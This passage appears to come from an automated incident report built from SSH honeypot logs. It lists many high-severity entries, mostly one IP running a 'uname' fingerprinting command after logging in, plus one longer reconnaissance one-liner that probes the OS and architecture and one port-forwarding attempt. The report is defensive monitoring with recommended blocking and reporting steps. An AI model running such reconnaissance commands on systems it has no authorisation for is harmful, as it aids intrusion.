| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 05:28:19` | `cowrie.session.connect` |
| `2026-08-15 05:28:19` | `cowrie.client.version` |
| `2026-08-15 05:28:19` | `cowrie.client.kex` |
| `2026-08-15 05:28:20` | `cowrie.login.success` |
| `2026-08-15 05:28:21` | `cowrie.session.params` |
| `2026-08-15 05:28:21` | `cowrie.command.input` |
| `2026-08-15 05:28:21` | `cowrie.log.closed` |
| `2026-08-15 05:28:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ea6f57b3401f

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-08-15 05:28 |
| **Last Seen** | 2026-08-15 05:28 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 05:28:25` | `cowrie.session.connect` |
| `2026-08-15 05:28:25` | `cowrie.client.version` |
| `2026-08-15 05:28:25` | `cowrie.client.kex` |
| `2026-08-15 05:28:25` | `cowrie.login.success` |
| `2026-08-15 05:28:26` | `cowrie.session.params` |
| `2026-08-15 05:28:26` | `cowrie.command.input` |
| `2026-08-15 05:28:26` | `cowrie.log.closed` |
| `2026-08-15 05:28:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-06bd5365c3a8

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-08-15 05:28 |
| **Last Seen** | 2026-08-15 05:28 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 05:28:30` | `cowrie.session.connect` |
| `2026-08-15 05:28:30` | `cowrie.client.version` |
| `2026-08-15 05:28:30` | `cowrie.client.kex` |
| `2026-08-15 05:28:31` | `cowrie.login.success` |
| `2026-08-15 05:28:31` | `cowrie.session.params` |
| `2026-08-15 05:28:31` | `cowrie.command.input` |
| `2026-08-15 05:28:32` | `cowrie.log.closed` |
| `2026-08-15 05:28:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-94e9afca196b

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-08-15 05:28 |
| **Last Seen** | 2026-08-15 05:28 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 05:28:35` | `cowrie.session.connect` |
| `2026-08-15 05:28:35` | `cowrie.client.version` |
| `2026-08-15 05:28:35` | `cowrie.client.kex` |
| `2026-08-15 05:28:36` | `cowrie.login.success` |
| `2026-08-15 05:28:37` | `cowrie.session.params` |
| `2026-08-15 05:28:37` | `cowrie.command.input` |
| `2026-08-15 05:28:37` | `cowrie.log.closed` |
| `2026-08-15 05:28:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b0790a0f95bf

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-08-15 05:28 |
| **Last Seen** | 2026-08-15 05:28 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 05:28:41` | `cowrie.session.connect` |
| `2026-08-15 05:28:41` | `cowrie.client.version` |
| `2026-08-15 05:28:41` | `cowrie.client.kex` |
| `2026-08-15 05:28:42` | `cowrie.login.success` |
| `2026-08-15 05:28:43` | `cowrie.session.params` |
| `2026-08-15 05:28:43` | `cowrie.command.input` |
| `2026-08-15 05:28:43` | `cowrie.log.closed` |
| `2026-08-15 05:28:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-40ff83eec99c

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-08-15 05:28 |
| **Last Seen** | 2026-08-15 05:28 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 05:28:46` | `cowrie.session.connect` |
| `2026-08-15 05:28:46` | `cowrie.client.version` |
| `2026-08-15 05:28:46` | `cowrie.client.kex` |
| `2026-08-15 05:28:46` | `cowrie.login.success` |
| `2026-08-15 05:28:47` | `cowrie.session.params` |
| `2026-08-15 05:28:47` | `cowrie.command.input` |
| `2026-08-15 05:28:47` | `cowrie.log.closed` |
| `2026-08-15 05:28:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dd17dde2b5d0

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-08-15 05:28 |
| **Last Seen** | 2026-08-15 05:28 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 05:28:51` | `cowrie.session.connect` |
| `2026-08-15 05:28:51` | `cowrie.client.version` |
| `2026-08-15 05:28:51` | `cowrie.client.kex` |
| `2026-08-15 05:28:52` | `cowrie.login.success` |
| `2026-08-15 05:28:52` | `cowrie.session.params` |
| `2026-08-15 05:28:52` | `cowrie.command.input` |
| `2026-08-15 05:28:53` | `cowrie.log.closed` |
| `2026-08-15 05:28:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8d336b7b0e0a

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-08-15 05:28 |
| **Last Seen** | 2026-08-15 05:28 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 05:28:56` | `cowrie.session.connect` |
| `2026-08-15 05:28:56` | `cowrie.client.version` |
| `2026-08-15 05:28:56` | `cowrie.client.kex` |
| `2026-08-15 05:28:57` | `cowrie.login.success` |
| `2026-08-15 05:28:58` | `cowrie.session.params` |
| `2026-08-15 05:28:58` | `cowrie.command.input` |
| `2026-08-15 05:28:58` | `cowrie.log.closed` |
| `2026-08-15 05:28:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-34de8a12fcdf

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-08-15 05:29 |
| **Last Seen** | 2026-08-15 05:29 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 05:29:01` | `cowrie.session.connect` |
| `2026-08-15 05:29:02` | `cowrie.client.version` |
| `2026-08-15 05:29:02` | `cowrie.client.kex` |
| `2026-08-15 05:29:02` | `cowrie.login.success` |
| `2026-08-15 05:29:03` | `cowrie.session.params` |
| `2026-08-15 05:29:03` | `cowrie.command.input` |
| `2026-08-15 05:29:03` | `cowrie.log.closed` |
| `2026-08-15 05:29:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-144679f03ba5

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-08-15 05:29 |
| **Last Seen** | 2026-08-15 05:29 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 05:29:07` | `cowrie.session.connect` |
| `2026-08-15 05:29:07` | `cowrie.client.version` |
| `2026-08-15 05:29:07` | `cowrie.client.kex` |
| `2026-08-15 05:29:08` | `cowrie.login.success` |
| `2026-08-15 05:29:09` | `cowrie.session.params` |
| `2026-08-15 05:29:09` | `cowrie.command.input` |
| `2026-08-15 05:29:09` | `cowrie.log.closed` |
| `2026-08-15 05:29:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-997915fbfb5b

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-08-15 05:29 |
| **Last Seen** | 2026-08-15 05:29 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 05:29:12` | `cowrie.session.connect` |
| `2026-08-15 05:29:12` | `cowrie.client.version` |
| `2026-08-15 05:29:12` | `cowrie.client.kex` |
| `2026-08-15 05:29:13` | `cowrie.login.success` |
| `2026-08-15 05:29:13` | `cowrie.session.params` |
| `2026-08-15 05:29:13` | `cowrie.command.input` |
| `2026-08-15 05:29:14` | `cowrie.log.closed` |
| `2026-08-15 05:29:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-96a43db7d48b

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-08-15 05:29 |
| **Last Seen** | 2026-08-15 05:29 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 05:29:18` | `cowrie.session.connect` |
| `2026-08-15 05:29:18` | `cowrie.client.version` |
| `2026-08-15 05:29:18` | `cowrie.client.kex` |
| `2026-08-15 05:29:18` | `cowrie.login.success` |
| `2026-08-15 05:29:19` | `cowrie.session.params` |
| `2026-08-15 05:29:19` | `cowrie.command.input` |
| `2026-08-15 05:29:19` | `cowrie.log.closed` |
| `2026-08-15 05:29:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0b22e2257454

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-08-15 05:29 |
| **Last Seen** | 2026-08-15 05:29 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 05:29:23` | `cowrie.session.connect` |
| `2026-08-15 05:29:23` | `cowrie.client.version` |
| `2026-08-15 05:29:23` | `cowrie.client.kex` |
| `2026-08-15 05:29:23` | `cowrie.login.success` |
| `2026-08-15 05:29:24` | `cowrie.session.params` |
| `2026-08-15 05:29:24` | `cowrie.command.input` |
| `2026-08-15 05:29:25` | `cowrie.log.closed` |
| `2026-08-15 05:29:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f6fddcb95c74

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-08-15 05:29 |
| **Last Seen** | 2026-08-15 05:29 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 05:29:28` | `cowrie.session.connect` |
| `2026-08-15 05:29:28` | `cowrie.client.version` |
| `2026-08-15 05:29:28` | `cowrie.client.kex` |
| `2026-08-15 05:29:29` | `cowrie.login.success` |
| `2026-08-15 05:29:30` | `cowrie.session.params` |
| `2026-08-15 05:29:30` | `cowrie.command.input` |
| `2026-08-15 05:29:30` | `cowrie.log.closed` |
| `2026-08-15 05:29:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0cf39039854d

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-08-15 05:29 |
| **Last Seen** | 2026-08-15 05:29 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 05:29:34` | `cowrie.session.connect` |
| `2026-08-15 05:29:34` | `cowrie.client.version` |
| `2026-08-15 05:29:34` | `cowrie.client.kex` |
| `2026-08-15 05:29:34` | `cowrie.login.success` |
| `2026-08-15 05:29:35` | `cowrie.session.params` |
| `2026-08-15 05:29:35` | `cowrie.command.input` |
| `2026-08-15 05:29:35` | `cowrie.log.closed` |
| `2026-08-15 05:29:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-09721e117822

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-08-15 05:29 |
| **Last Seen** | 2026-08-15 05:29 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 05:29:39` | `cowrie.session.connect` |
| `2026-08-15 05:29:39` | `cowrie.client.version` |
| `2026-08-15 05:29:39` | `cowrie.client.kex` |
| `2026-08-15 05:29:40` | `cowrie.login.success` |
| `2026-08-15 05:29:40` | `cowrie.session.params` |
| `2026-08-15 05:29:40` | `cowrie.command.input` |
| `2026-08-15 05:29:40` | `cowrie.log.closed` |
| `2026-08-15 05:29:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0ccb5a499d4b

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-08-15 05:29 |
| **Last Seen** | 2026-08-15 05:29 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 05:29:44` | `cowrie.session.connect` |
| `2026-08-15 05:29:44` | `cowrie.client.version` |
| `2026-08-15 05:29:44` | `cowrie.client.kex` |
| `2026-08-15 05:29:45` | `cowrie.login.success` |
| `2026-08-15 05:29:45` | `cowrie.session.params` |
| `2026-08-15 05:29:45` | `cowrie.command.input` |
| `2026-08-15 05:29:46` | `cowrie.log.closed` |
| `2026-08-15 05:29:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aebca414ac55

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-08-15 05:29 |
| **Last Seen** | 2026-08-15 05:29 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 05:29:49` | `cowrie.session.connect` |
| `2026-08-15 05:29:49` | `cowrie.client.version` |
| `2026-08-15 05:29:49` | `cowrie.client.kex` |
| `2026-08-15 05:29:50` | `cowrie.login.success` |
| `2026-08-15 05:29:51` | `cowrie.session.params` |
| `2026-08-15 05:29:51` | `cowrie.command.input` |
| `2026-08-15 05:29:51` | `cowrie.log.closed` |
| `2026-08-15 05:29:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-556eb1d4c05c

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-08-15 05:29 |
| **Last Seen** | 2026-08-15 05:29 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 05:29:54` | `cowrie.session.connect` |
| `2026-08-15 05:29:54` | `cowrie.client.version` |
| `2026-08-15 05:29:54` | `cowrie.client.kex` |
| `2026-08-15 05:29:55` | `cowrie.login.success` |
| `2026-08-15 05:29:56` | `cowrie.session.params` |
| `2026-08-15 05:29:56` | `cowrie.command.input` |
| `2026-08-15 05:29:56` | `cowrie.log.closed` |
| `2026-08-15 05:29:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-701f786f3187

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-08-15 05:29 |
| **Last Seen** | 2026-08-15 05:30 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 05:29:59` | `cowrie.session.connect` |
| `2026-08-15 05:30:00` | `cowrie.client.version` |
| `2026-08-15 05:30:00` | `cowrie.client.kex` |
| `2026-08-15 05:30:01` | `cowrie.login.success` |
| `2026-08-15 05:30:02` | `cowrie.session.params` |
| `2026-08-15 05:30:02` | `cowrie.command.input` |
| `2026-08-15 05:30:02` | `cowrie.log.closed` |
| `2026-08-15 05:30:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e2d21eb6ac85

| Field | Detail |
|---|---|
| **Source IP** | `211.247.127[.]250` |
| **First Seen** | 2026-08-15 05:30 |
| **Last Seen** | 2026-08-15 05:30 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 05:30:04` | `cowrie.session.connect` |
| `2026-08-15 05:30:06` | `cowrie.client.version` |
| `2026-08-15 05:30:06` | `cowrie.client.kex` |
| `2026-08-15 05:30:09` | `cowrie.login.success` |
| `2026-08-15 05:30:11` | `cowrie.direct-tcpip.request` |
| `2026-08-15 05:30:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.247.127[.]250` to AbuseIPDB if not already reported
- [ ] Block `211.247.127[.]250` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5acd90f70c3e

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-08-15 05:30 |
| **Last Seen** | 2026-08-15 05:30 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 05:30:05` | `cowrie.session.connect` |
| `2026-08-15 05:30:05` | `cowrie.client.version` |
| `2026-08-15 05:30:05` | `cowrie.client.kex` |
| `2026-08-15 05:30:06` | `cowrie.login.success` |
| `2026-08-15 05:30:07` | `cowrie.session.params` |
| `2026-08-15 05:30:07` | `cowrie.command.input` |
| `2026-08-15 05:30:07` | `cowrie.log.closed` |
| `2026-08-15 05:30:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-356b78f0f6bc

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-08-15 05:30 |
| **Last Seen** | 2026-08-15 05:30 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 05:30:07` | `cowrie.session.connect` |
| `2026-08-15 05:30:08` | `cowrie.client.version` |
| `2026-08-15 05:30:08` | `cowrie.client.kex` |
| `2026-08-15 05:30:10` | `cowrie.login.success` |
| `2026-08-15 05:30:11` | `cowrie.session.params` |
| `2026-08-15 05:30:11` | `cowrie.command.input` |
| `2026-08-15 05:30:11` | `cowrie.command.input` |
| `2026-08-15 05:30:11` | `cowrie.command.input` |
| `2026-08-15 05:30:11` | `cowrie.command.input` |
| `2026-08-15 05:30:11` | `cowrie.command.input` |
| `2026-08-15 05:30:11` | `cowrie.command.success` |
| `2026-08-15 05:30:11` | `cowrie.command.input` |
| `2026-08-15 05:30:11` | `cowrie.command.input` |
| `2026-08-15 05:30:11` | `cowrie.command.input` |
| `2026-08-15 05:30:11` | `cowrie.command.input` |
| `2026-08-15 05:30:12` | `cowrie.log.closed` |
| `2026-08-15 05:30:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9a54ace9bb12

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-08-15 05:30 |
| **Last Seen** | 2026-08-15 05:30 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 05:30:10` | `cowrie.session.connect` |
| `2026-08-15 05:30:10` | `cowrie.client.version` |
| `2026-08-15 05:30:10` | `cowrie.client.kex` |
| `2026-08-15 05:30:11` | `cowrie.login.success` |
| `2026-08-15 05:30:12` | `cowrie.session.params` |
| `2026-08-15 05:30:12` | `cowrie.command.input` |
| `2026-08-15 05:30:12` | `cowrie.log.closed` |
| `2026-08-15 05:30:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-407500d4bd72

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-08-15 05:30 |
| **Last Seen** | 2026-08-15 05:30 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 05:30:15` | `cowrie.session.connect` |
| `2026-08-15 05:30:15` | `cowrie.client.version` |
| `2026-08-15 05:30:15` | `cowrie.client.kex` |
| `2026-08-15 05:30:16` | `cowrie.login.success` |
| `2026-08-15 05:30:17` | `cowrie.session.params` |
| `2026-08-15 05:30:17` | `cowrie.command.input` |
| `2026-08-15 05:30:17` | `cowrie.log.closed` |
